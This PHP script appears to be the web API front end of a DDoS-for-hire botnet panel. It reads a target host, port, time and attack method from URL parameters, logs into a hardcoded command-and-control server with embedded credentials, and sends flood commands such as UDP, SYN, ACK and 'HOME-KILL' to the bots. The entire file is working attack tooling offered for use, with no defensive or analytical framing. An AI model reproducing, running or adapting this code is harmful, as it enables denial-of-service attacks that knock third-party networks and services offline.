<?php
//API Link: http://ServerIP/API.php?&host=$host&port=$port&time=$time&type=$method
set_time_limit(0);

$server = "23.254.226.200";
$conport = 1337;
$username = "wese";
$password = "dox";

$activekeys = array();

$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

if($method == "STDHEX"){$command = "!* STD $target $port $time";}
if($method == "UDP"){$command = "!* UDP $target $port $time 32 12000 10";}
if($method == "STD"){$command = "!* STD $target $port $time";}
if($method == "XMAS"){$command = "!* TCP $target $port $time 32 all 1460 10";}
if($method == "HOME-FUCK"){$command = "!* UDP $target $port $time 32 1250 10";}
if($method == "SYN"){$command = "!* TCP $target $port $time SYN 1460 10";}
if($method == "LDAP"){$command = "!* UDP $target $port $time 32 1200 10";}
if($method == "CLDAP"){$command = "!* TCP $target $port $time 32 1460 10";}
if($method == "HOME-SLAP"){$command = "!* STD $target $port $time 1350";}
if($method == "HOME-KILL"){$command = "!* TCP $target $port $time 32 ACK 800 10";}
if($method == "SYN"){$command = "!* TCP $target $port $time 32 SYN 800 10";}
if($method == "NTP"){$command = "!* UDP $target $port $time 32 1200 10";}


$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
        }

        fwrite($sock, $command . "\n");
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>